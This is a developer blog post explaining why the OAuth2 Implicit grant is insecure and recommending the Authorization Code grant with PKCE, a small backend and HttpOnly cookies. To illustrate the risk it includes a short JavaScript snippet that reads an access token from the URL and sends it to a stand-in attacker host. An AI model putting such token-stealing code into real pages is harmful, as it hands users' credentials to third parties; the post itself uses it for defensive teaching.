---
layout: blog-post
title: What's Wrong With the Implicit Grant?
description: OAuth2 specifies an Implicit grant. What's wrong with using it?
author: Brian Pontarelli
image: blogs/securing-golang-microservice-jwt/securing-a-go-microservice-with-jwt-header-image.png
category: blog
tags: client-javascript
excerpt_separator: "<!--more-->"
---
The Implicit grant is part of the OAuth 2 RFC, but is [one of the features omitted in the OAuth 2.1 specification](/learn/expert-advice/oauth/differences-between-oauth-2-oauth-2-1/). With this grant, you don't have to write server side code. Instead of having to exchange an authorization code for an access token, you are provided an access token on redirect.

<!--more-->

This is convenient if you are working in the JAMstack or in another situation where you don't want to run a server. 

However, it is horribly insecure, broken, deprecated, and should never, ever be used (ever). Okay, maybe that's being a bit dramatic, but please don't use this grant. The good folks behind the OAuth 2.1 draft agree, which is why they left it out of that new specification.

> The Implicit grant ("response_type=token") is omitted from this specification as per Section 2.1.2 of OAuth 2.0 Security Best Current Practices

## Run away

Instead of showing you how to use this grant, let's discuss why you should avoid it.

{% include _image.liquid src="/assets/img/blogs/avoid-implicit-grant/Rabbitattack.jpg" alt="Just a rabbit?" class="img-fluid" figure=false %}

The reason that it has been removed is that it skips an important step that allows you to secure the tokens you receive from the OAuth server. This step occurs when your application backend makes the call to the Token endpoint to retrieve the tokens.

Unlike the [Authorization Code grant](/docs/v1/tech/oauth/#example-authorization-code-grant), the Implicit grant does not redirect the browser back to your application backend with an Authorization Code. Instead, it puts the access token directly on the URL as part of the redirect. These URLs look like this:

`https://piedpiper.com/#token-goes-here`

The token is added to the redirect URL after the `#` symbol, which means it is technically the fragment portion of the URL. What this means is that wherever the OAuth server redirects the browser to, the access token is accessible to any code running in the browser. In other words, to basically everyone. 

To be more precise, the access token is accessible to any and all JavaScript that is running in the browser (including third party libraries). Since this token allows the browser to make API calls and web requests on behalf of the user, having this token be accessible to third-party code is extremely dangerous.

Let's take a dummy example of a single-page web application that uses the Implicit grant:

```html
// This is dummy code for a SPA that uses the access token
<html>
<head>
  <script type="text/javascript" src="/my-spa-code-1.0.0.js"></script>
  <script type="text/javascript" src="https://some-third-party-server.com/a-library-found-online-that-looked-cool-0.42.0.js"></script>
</head>
<body>
...
</body>
```

This HTML includes two JavaScript libraries:

* The code for the application itself (`my-spa-code-1.0.0.js`).
* A library we found online that did something cool and we just pulled it in (`a-library-found-online-that-looked-cool-0.42.0.js`).

Let's assume that our code is 100% secure and we don't have to worry about it. The issue here is that the library we pulled in is an unknown quantity. 

It might include other libraries as well. Remember that the DOM is dynamic. Any JavaScript can load any other JavaScript library simply by updating the DOM with more `<script>` tags. Therefore, we have very little chance of ensuring that every other line of code from third-party libraries is secure. 

After all, **do you** audit every javascript library and every dependency of every library every time you deploy your application? 

If a third-party library wanted to steal an access token from our dummy application, all it would need to do is run this code:

```javascript
if (window.location.hash.contains('access_token')) {
  fetch('http://steal-those-tokens.com/yummy?hash=' + window.location.hash);
}
```

Three lines of code and the access token has been stolen. As you can see, the risk of leaking tokens is far too high to ever consider using the Implicit grant. This is why we recommend that no one ever use this grant.

## How to correctly use OAuth in a SPA

Well, if you are building an awesome React, Angular, Vue or other single page application, what should you use instead of the Implicit grant?

Use the Authorization Code grant. It's secure, safe, well tested, standardized and keeps tokens out of the URL.

In addition to using that grant, take these steps to secure your SPA OAuth flow:

* Use PKCE in your SPA to make sure your application, which can't maintain a secure client secret, is not susceptible to an authorization code interception attack.
* Run a server. It needn't be complicated. In fact, it can be as simple as a few lines of node to exchange the authorization code for an access token. Here's [an example Node application](https://github.com/fusionauth/fusionauth-example-node). This is also known as the BFF, or Backend For a Frontend, pattern.
* Store access tokens out of reach of JavaScript in the browser. You could store them in a server side session, or in `secure`, `HttpOnly` cookies.

Want to learn more about the different OAuth grants? Check out [The Modern Guide to OAuth](/learn/expert-advice/oauth/modern-guide-to-oauth/) for an in-depth look at all the different OAuth grants and how you might use them in the real world.

Happy coding!
